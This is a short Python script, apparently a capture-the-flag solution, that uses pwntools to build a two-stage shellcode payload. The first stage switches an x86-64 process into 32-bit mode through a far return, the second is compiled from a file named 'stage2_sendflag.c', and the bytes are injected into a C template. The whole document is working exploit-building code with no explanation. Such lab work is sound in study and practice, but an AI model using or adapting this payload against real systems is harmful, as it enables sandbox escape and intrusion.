from pwn import *
import cshc
context("amd64", "linux")

shellcode = ""
#enter 32-bit mode and execute stage2.c
shellcode += flat(asm(r"""
a:
    mov esp, 0x1000fffc
    mov ax, 0x2b
    mov ds, ax
    mov es, ax
    sub esp, 8
    mov dword [esp+4], 0x23
    mov dword [esp], b - a + 0x10000000
    retf
b:
"""))

shellcode += cshc.arch("x86").compile_file("stage2_sendflag.c")

open("stage1.c", "w").write(open("stage1_tmpl.c").read().replace("REPLACE_ME",
    "{" + ",".join([str(ord(val)) for val in shellcode])  +  "}"
))
